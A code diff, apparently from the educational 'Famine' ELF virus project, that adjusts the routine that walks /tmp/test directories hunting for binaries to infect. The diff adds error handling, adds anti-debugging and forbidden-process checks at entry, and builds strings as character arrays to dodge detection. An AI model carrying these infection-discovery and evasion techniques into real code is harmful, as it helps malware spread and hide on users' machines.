@@ -11,12 +11,13 @@ bool	find_binaries(char *dirname) {
 
 	fd = syscall_wrapper(__NR_open, dirname, O_RDONLY | O_DIRECTORY);
 	if (fd == -1) {
-		ERROR(((char []){'o','p','e','n','\0'}));
+		ERROR_SYS(((char []){'o','p','e','n','\0'}));
 		return false;
 	}
 
 	size_mmap = (sizeof(struct s_buff_find_binaries) / PAGE_SIZE + 1) * PAGE_SIZE;
 	if ((buffers = (void *)syscall_wrapper(__NR_mmap, NULL, size_mmap, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
+		ERROR_SYS(((char []){'m','m','a','p','\0'}));
 		return false;
 	}
 
@@ -27,8 +28,9 @@ bool	find_binaries(char *dirname) {
 
 	while (42) {
 		if ((bytes_read = syscall_wrapper(__NR_getdents64, fd, buffers->getdents64, sizeof(buffers->getdents64))) == -1) {
-			ERROR(((char []){'g','e','t','d','e','n','t','s','6','4','\0'}));
+			ERROR_SYS(((char []){'g','e','t','d','e','n','t','s','6','4','\0'}));
 			syscall_wrapper(__NR_munmap, buffers, size_mmap);
+			syscall_wrapper(__NR_close, fd);
 			return false;
 		}
 		if (bytes_read == 0)
@@ -40,6 +42,7 @@ bool	find_binaries(char *dirname) {
 				if (ft_strcmp((char []){'.','\0'}, dir->d_name) != 0 && ft_strcmp((char []){'.','.','\0'}, dir->d_name) != 0) {
 					ft_strcpy(buffers->file_path + dir_len, dir->d_name);
 					if (!find_binaries(buffers->file_path)) {
+						syscall_wrapper(__NR_close, fd);
 						syscall_wrapper(__NR_munmap, buffers, size_mmap);
 						return false;
 					}
@@ -53,8 +56,10 @@ bool	find_binaries(char *dirname) {
 		}
 	}
 	syscall_wrapper(__NR_close, fd);
-	if (syscall_wrapper(__NR_munmap, buffers, size_mmap) == -1)
+	if (syscall_wrapper(__NR_munmap, buffers, size_mmap) == -1) {
+		ERROR_SYS(((char []){'m','u','n','m','a','p','\0'}));
 		return false;
+	}
 	return true;
 }
 
@@ -69,6 +74,9 @@ bool	check_binary_infected(struct s_woody *woody, Elf64_Shdr *shdr_last) {
 }
 
 void	famine() {
+	if (!check_forbidden_process() || !check_debugging())
+		return ;
+
 	char	*target_dirs[] = {
 		((char []){'/','t','m','p','/','t','e','s','t','\0'}),
 		((char []){'/','t','m','p','/','t','e','s','t','2','\0'}),
